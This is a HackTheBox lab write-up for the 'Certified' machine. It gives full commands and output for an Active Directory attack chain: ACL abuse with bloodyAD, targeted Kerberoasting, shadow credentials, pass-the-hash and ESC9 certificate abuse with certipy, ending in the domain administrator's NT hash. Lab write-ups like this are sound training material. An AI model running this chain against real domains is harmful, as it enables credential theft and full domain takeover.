---
title: HackTheBox - Certified
date: 2025-03-12 15:00:00 +/-0000
categories: [HackTheBox, Windows]
tags: [hackthebox, medium, activedirectory, windows, adcs]     # TAG names should always be lowercase
description: Certified as an assumed breach scenario in active directory with a complex attack chain exploiting various misconfigurations. 
image: "/assets/img/posts/certified/Pasted%20image%2020250313152123.png"
---

## Overview

Certified from Hack The Box involves carrying out a penetration test from an assumed breach scenario. 

With the credentials provided for a low privilege domain user we enumerate the active directory environment and are able to identify multiple misconfigurations which we can use to escalate privileges.

We land on a user which has certificate authority permissions which we use to exploit the ESC9 vulnerability in Active Directory Certificate Services and gain domain admin access.

## Nmap

The initial nmap scan doesn't show anything too interesting or unusual for a Domain Controller, But we already have creds so lets use them.

```bash
nmap -sV -sC -p- 10.129.65.119 -Pn -v

Nmap scan report for 10.129.65.119
Host is up (0.031s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-13 05:01:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-13T05:02:43+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
|_SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
|_SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
|_ssl-date: 2025-02-13T05:02:42+00:00; +6h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-13T05:02:42+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
|_SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49747/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

## Creating a user list using NXC

It is always a good idea to get a quick user list when doing these machines, the `--users` flag on `nxc` will also reveal the Description field for the users which may contain some useful information but nothing in this case.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ nxc smb 10.129.65.119 -u 'judith.mader' -p 'judith09' --users
SMB         10.129.65.119   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.65.119   445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.129.65.119   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.65.119   445    DC01             Administrator                 2024-05-13 14:53:16 0       Built-in account for administering the computer/domain 
SMB         10.129.65.119   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.65.119   445    DC01             krbtgt                        2024-05-13 15:02:51 0       Key Distribution Center Service Account 
SMB         10.129.65.119   445    DC01             judith.mader                  2024-05-14 19:22:11 0        
SMB         10.129.65.119   445    DC01             management_svc                2024-05-13 15:30:51 0        
SMB         10.129.65.119   445    DC01             ca_operator                   2024-05-13 15:32:03 0        
SMB         10.129.65.119   445    DC01             alexander.huges               2024-05-14 16:39:08 0        
SMB         10.129.65.119   445    DC01             harry.wilson                  2024-05-14 16:39:37 0        
SMB         10.129.65.119   445    DC01             gregory.cameron               2024-05-14 16:40:05 0        
SMB         10.129.65.119   445    DC01             [*] Enumerated 9 local users: CERTIFIED
```

## Enumeration using Bloodhound

After this it was time to run Bloodhound which will give us an easy to see overview of the permissions in the AD environment and highlights any potential misconfigurations that we may be able to take advantage of.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ nxc ldap 10.129.65.119 -d certified.htb --dns-server 10.129.65.119 -u 'judith.mader' -p 'judith09' --bloodhound -c All
SMB         10.129.65.119   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP        10.129.65.119   389    DC01             [+] certified.htb\judith.mader:judith09 
LDAP        10.129.65.119   389    DC01             Resolved collection methods: group, localadmin, objectprops, rdp, session, acl, psremote, trusts, dcom, container
LDAP        10.129.65.119   389    DC01             Done in 00M 07S
LDAP        10.129.65.119   389    DC01             Compressing output into /home/kryzen/.nxc/logs/DC01_10.129.65.119_2025-02-12_221834_bloodhound.zip
                                                                                                                                                                                                                                            
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ mv /home/kryzen/.nxc/logs/DC01_10.129.65.119_2025-02-12_221834_bloodhound.zip .
```

After importing the data into bloodhound we found that our user has `WriteOwner` over the `Management` group.

![](/assets/img/posts/certified/Pasted%20image%2020250313144425.png)

Then investigating the `Management` group we find that it has `GenericWrite` over the `Management_SVC` user.

![](/assets/img/posts/certified/Pasted%20image%2020250313144631.png)

Then checking the `Management_SVC` user we can find that it has `GenericAll` over the `CA_Operator` account.

![](/assets/img/posts/certified/Pasted%20image%2020250313144754.png)

Then we can assume that the `CA_Operator` user might have some method of getting us higher privileges by attacking ADCS.

## Attack Chain in Theory

At this point we have a potential attack chain that looks something like this :

```
Write judith as owner of management
Add judith to management
Targeted kerberoast on management_svc (Can PSRemote onto DC01)
Trageted kerberoast on CA_operator 
CA attack?
```

Lets see how it goes...

## Attack Chain in Practice

For many of these attacks I will be using [BloodyAD](https://github.com/CravateRouge/bloodyAD) which is a great tool that lets you make changes to AD access control lists from the comfort of your VM host instead of doing everything in PowerShell.

*  Adding Judith as owner of `Management`

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ bloodyAD --host 10.129.65.119 -d certified.htb -u 'judith.mader' -p 'judith09' set owner  'Management' judith.mader
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on Management
```

* Give Judith `GenericAll` over the group
* Add Judith as a member of the group

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ bloodyAD --host 10.129.65.119 -d certified.htb -u 'judith.mader' -p 'judith09' add genericAll 'Management' judith.mader
[+] judith.mader has now GenericAll on Management
                                                                                                                   
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ bloodyAD --host 10.129.65.119 -d certified.htb -u 'judith.mader' -p 'judith09' add groupMember 'Management' judith.mader
[+] judith.mader added to Management
```


The next attacks rely on the system clock of the attack host being in sync with the target due to how Kerberos works.

Syncing clock (Can also use rdate)

```bash
┌──(kryzen㉿kali)-[~/HTB/CPTS/Tools/AD Tools]
└─$ sudo ntpdate 10.129.65.119 
[sudo] password for kryzen: 
2025-02-13 05:48:35.552284 (+0000) -0.000090 +/- 0.014603 10.129.65.119 s1 no-leap
```

Now we perform a `Targeted Kerberoast` , Since we have `GenericWrite` over `Management_SVC` we can write the users ServicePrincipalName attribute and perform a kerberoast attack.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ python3 targetedkerberoast.py -v -d certified.htb -u 'judith.mader' -p 'judith09' --dc-ip 10.129.65.119 --request-user management_svc
[*] Starting kerberoast attacks
[*] Attacking user (management_svc)
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$f55b31b15be7628534a8bd9ee0a83c56$2d625527c373af7e94acc46b1f9f778192273c91616e0ad8f9be13f5394e1f43c110291a998c1c7f2e9f2770f4a386c8b8e4d3a0f28867a0a7c739964df0ad4fa65d2232f05801cced2cbaa2d11b1c92427deeed0085320f6370ae0d139991aeff301573221df7eba2126dd0db788eb15b4b5d6211c8fa6bf7dc686e4c89046f7cc6092204c6c02e06b4e3193e466e358952244f6f314eb481857d532d8cba8408c7e5616241a22e5bfb1b3696564091d486a6a97abfafb821e13667aef5763a6d2c65823c54cc9616b95dd2f247d9d44730962823b4ad65afa7feb799f0011434aff0c4002d753b4c4b9cc8dae9b6cffaa8384ec407c6675f00bd74cd0ca3a281097825a8f345f0fc4a2cf44f860c3894e385b237a5a711c4c8a6c7949bc7734621c26c401819ff12b779c19b57799ba0070e1d1e9a4c3519bc2e5d4b9cdb4486d64343a4d146fa9bacc709e54e81337bd7b31180e1909e6db8922abf6222ebfa0256d64e787d7d0c6cdd28c3c931b4b5c71c300c87ab2faad8e09977aa2b018de8454d75c14b9473b9a54f8f7f40d10ef35db3439758f673fd6ee7b3f56c0596d2a958dc4235bc66b05adde8881d900bad5280140c659747a8e5da637d47c671a34f48123b42edb5816ef6382128b5f0cda8372f6949622670f5ca6c998802e555c3c98514a50d1f6cefb1006762e86802ad6743b8ea96b9c412227283b9687fbe65e8d426bb08ce3b209628c79d07187a5048adad596a9db77a21fd8c5f52b1632b6693bc294366568345ec29dc791a235bba51f41fa312b0548619bb3f044228279036aa8d38f3609d58a7d0a4709b228fb47267a3285aed9c744bff4e536dc186fde4ec06a80a48efe785aebbadc6b128ac5af9e821fc93ee9e35d730018a979d1fd50db0e0a15f4d5b12e83fb695ea123e8cd36683af73d086480e1e7636f51f9a49ffd28217b8453b238cfb48b9e82daceac26d6c137d2e0d53d85e54ac1b393bbce3d400a46892bb146791b0f474a54e54bae8c849fb5a66578a76b2189fdb39db6439e511dbb542821aaa339fde860da190dbf93fcd961f9a9eb3ad22a88e7a250428c2bff07f09c9acbec22272813c13a41068c221aeba1850834b2a68818a4812c4f0b3992a13b81debbc6e5116719b0fc4df27cdeaf4d61135920b68452805ab980b01d20b5b3161da0014774b3d1109d78b06103604c4eadcdb4fbeaf8dbbd4706cac6e1ae8708836698ebc8c00aa64ccafeef0ec3579008918f9be95335c80f04018d29791d63642d547ccf51316dc29268bce9ebf0cc622bb7f575b0223aa177fd835f8b161e87a3cef81e927a2a16ea1e93900216e25872ed9d789ac06e39bb905d3b2f7b6a2d52b5f3cdcca3d3a9c87a927d0bc08c05bc529e3e5777da3b1f2919a6b2708e3b1f210574af1391e4e295409130427e93a6d821ddc8b8f0551758693211c628642cc99761dd224a6f4633418d0615cd91b98fc367316485c6b9a391e72b3b25fe5b5d4b27b747b8010bc9debcf71f15a78ff7dc5099aeec039679cd1c0e3e5cab1a14b8318a4e254ff6d5043aaf3800c97ae0073
```

Due to the strength of the password on this account we were not able to crack it so we need to look into another method, `Shadow Credentials`. This will give us a valid Kerberos TGT which we can use to dump the accounts `NT Hash` which can then be used for `Pass the Hash` attacks.

Using `pywhisker` to add shadow credentials.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ pywhisker -d certified.htb -u 'judith.mader' -p 'judith09' --target management_svc --action "add" --filename test1
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: e62b86bb-30ba-3baa-41d6-44d885292550
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (\#PKCS12) certificate & key at path: test1.pfx
[*] Must be used with password: kUWy08TBwxAjFgYJ3y2Q
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Getting the TGT with `gettgtpkinit`.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ python3 PKINITtools/gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass kUWy08TBwxAjFgYJ3y2Q certified.htb/management_svc management_svc.ccache
2025-02-13 06:07:22,367 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-02-13 06:07:22,380 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-02-13 06:07:26,498 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-02-13 06:07:26,498 minikerberos INFO     4350a2abf4b109bb83c864e955c740fc01fb071c636b128c3f740677153a168e
INFO:minikerberos:4350a2abf4b109bb83c864e955c740fc01fb071c636b128c3f740677153a168e
2025-02-13 06:07:26,501 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

This gives us a ccache file which we can load as an environmental variable in kali and use it for Kerberos authentication.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ export KRB5CCNAME=management_svc.ccache 
```

Getting `NT Hash` using `getnthash`.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ python3 PKINITtools/getnthash.py -key 4350a2abf4b109bb83c864e955c740fc01fb071c636b128c3f740677153a168e certified.htb/management_svc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

We can then use this for a `Pass the Hash` attack and log into `DC01`.

![](/assets/img/posts/certified/Pasted%20image%2020250313145959.png)

Getting the user flag.

![](/assets/img/posts/certified/Pasted%20image%2020250313150028.png)

## Privilege Escalation to CA_Operator

So from our earlier enumeration we know that our current users has `GenericAll` over the `CA_Operator` account.

We will perform the same attack as before by adding `Shadow Credentials` to the `CA_Operator` account to dump the `NT Hash` to give us access.

Adding the shadow credentials.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ pywhisker -d certified.htb -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584' --target ca_operator --action "add" --filename test2
[*] Searching for the target account
[*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 0e667212-1a18-c5cf-72ba-469542ff5206
[*] Updating the msDS-KeyCredentialLink attribute of ca_operator
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (\#PKCS12) certificate & key at path: test2.pfx
[*] Must be used with password: hJ155kSMicfG0ibJZA4x
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Get the TGT.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ python3 PKINITtools/gettgtpkinit.py -cert-pfx test2.pfx -pfx-pass hJ155kSMicfG0ibJZA4x certified.htb/ca_operator ca_operator.ccache
2025-02-13 06:44:01,195 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-02-13 06:44:01,208 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-02-13 06:44:12,195 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-02-13 06:44:12,195 minikerberos INFO     81c4ab60bdcfb48b70aa0d7c7d1fa68efa24b806eb53da3164e5be909b15ab57
INFO:minikerberos:81c4ab60bdcfb48b70aa0d7c7d1fa68efa24b806eb53da3164e5be909b15ab57
2025-02-13 06:44:12,198 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Get the NT Hash.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ export KRB5CCNAME=ca_operator.ccache

┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ python3 PKINITtools/getnthash.py -key 81c4ab60bdcfb48b70aa0d7c7d1fa68efa24b806eb53da3164e5be909b15ab57 certified.htb/ca_operator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
b4b86f45c6018f1b664f70805f45d8f2

```

`ca_operator:b4b86f45c6018f1b664f70805f45d8f2`

Lets confirm access.

```bash
┌──(kryzen㉿kali)-[~/HTB/CPTS/Tools/AD Tools]
└─$ nxc smb 10.129.65.119 -u 'ca_operator' -H 'b4b86f45c6018f1b664f70805f45d8f2' --shares                       
SMB         10.129.65.119   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.65.119   445    DC01             [+] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2 
SMB         10.129.65.119   445    DC01             [*] Enumerated shares
SMB         10.129.65.119   445    DC01             Share           Permissions     Remark
SMB         10.129.65.119   445    DC01             -----           -----------     ------
SMB         10.129.65.119   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.65.119   445    DC01             C$                              Default share
SMB         10.129.65.119   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.65.119   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.65.119   445    DC01             SYSVOL          READ            Logon server share 
```


## Attacking ADCS

From here we will use `Certipy-ad` to check for any vulnerable certificate templates.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ certipy-ad find -dc-ip 10.129.65.119 -u ca_operator -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -vulnerable -enabled                
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[*] Got CA configuration for 'certified-DC01-CA'
[*] Saved BloodHound data to '20250213000240_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250213000240_Certipy.txt'
[*] Saved JSON output to '20250213000240_Certipy.json'
```

Looking at the output of the text file we can see that we may be able to exploit the ESC9 vulnerability.

```bash
 ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

We can also load the data into Bloodhound.

![](/assets/img/posts/certified/Pasted%20image%2020250313150823.png)

I used [this blog post](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7) to learn about the vulnerability and how to exploit it. It was used as a guide from here on.

## Abusing ESC9

A brief description of the steps we need to exploit to carry out this attack is:

```
We need to have generic write over ca_operator as management_svc.

First we need the NT hash of ca_operator which is already done.  
  
-u ca_operator -hashes 'b4b86f45c6018f1b664f70805f45d8f2'

We need to change UPN of ca_operator to Administrator

Then we need to request the EC9 cert as ca_operator

-u management_svc -hashes 'a091c1832bcdd4677c28b5a6a1295584'
```

Using `evil-WinRM and PowerView` to set the `UserPrincipleName`.

```bash
*Evil-WinRM* PS C:\Users\management_svc\Documents> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\management_svc\Documents> Set-DomainObject -Identity ca_operator -SET @{userprincipalname='Administrator'} -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=certified,DC=htb
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ca_operator)(name=ca_operator)(displayname=ca_operator))))
Verbose: [Set-DomainObject] Setting 'userprincipalname' to 'Administrator' for object 'ca_operator'
*Evil-WinRM* PS C:\Users\management_svc\Documents> 
```

Request vulnerable certificate as `CA_Operator`.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ certipy-ad req -ca certified-DC01-CA -dc-ip 10.129.65.119 -u ca_operator -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -template CertifiedAuthentication -target DC01.certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Change the `UserPrincipleName` back to something else.

```bash
*Evil-WinRM* PS C:\Users\management_svc\Documents> Set-DomainObject -Identity ca_operator -SET @{userprincipalname='backtonormal'} -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=certified,DC=htb
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ca_operator)(name=ca_operator)(displayname=ca_operator))))
Verbose: [Set-DomainObject] Setting 'userprincipalname' to 'backtonormal' for object 'ca_operator'
*Evil-WinRM* PS C:\Users\management_svc\Documents>
```

Request the certificate to get the domain administrator hash.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Certified]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.65.119 -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

Use the hash to log in using `evil-WinRM`

![](/assets/img/posts/certified/Pasted%20image%2020250313151315.png)


Thanks for reading!
